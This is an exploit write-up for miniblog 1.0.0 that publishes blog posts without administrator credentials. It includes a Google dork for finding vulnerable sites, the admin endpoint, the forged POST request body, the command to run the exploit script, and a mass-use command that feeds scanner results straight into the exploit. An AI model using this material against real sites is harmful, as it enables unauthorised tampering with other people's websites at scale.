- miniblog 1.0.0 CSRF 4ADD post
------

```
  # SCRIPT by:     [ I N U R L  -  B R A S I L ] - [ By GoogleINURL ]
  # EXPLOIT NAME:  xpl miniblog 1.0.0 CSRF 4ADD post/ INURL BRASIL
  # AUTOR:         Cleiton Pinheiro / Nick: googleINURL
  # Email:         inurlbr@gmail.com
  # Blog:          http://blog.inurl.com.br
  # Twitter:       https://twitter.com/googleinurl
  # Fanpage:       https://fb.com/InurlBrasil
  # Pastebin       http://pastebin.com/u/Googleinurl
  # GIT:           https://github.com/googleinurl
  # PSS:           http://packetstormsecurity.com/user/googleinurl
  # YOUTUBE:       http://youtube.com/c/INURLBrasil
  # PLUS:          http://google.com/+INURLBrasil
```

- DESCRIPTION 
------
Script makes a post without administrative credentials.

- INFO
------
```
  # DATA SUBMISSION WITHOUT VALIDATION

  # Vendor:  http://www.spyka.net/scripts/php/miniblo

  # Google Dork: intext:"Powered by miniblog" ext:php

  # POC:  http://{YOU_URL}/adm/admin.php?mode=add

  # SEND REQUEST POST: adddata[post_title]=TITLE&data[post_content]=<b>YOU_POST</b>&data[published]=1&miniblog_PostBack=Add
```

- EXECUTE
------
```
php xpl.php -t http://target.us
FILE_OUTPUT:  miniblog_vuln.txt
```

- EXPLOIT MASS USE SCANNER INURLBR
------
```
php inurlbr.php --dork 'intext:"Powered by miniblog" ext:php' -s output.txt --command-all 'php xpl.php -t _TARGET_'
```
More details about inurlbr scanner: https://github.com/googleinurl/SCANNER-INURLBR

```
[+] Discoverer Author: Mustafa Moshkela  
[+] REF COD POC: http://www.exploit4arab.net/exploits/1482
[+] Greets to: all members in iq-team.org
```
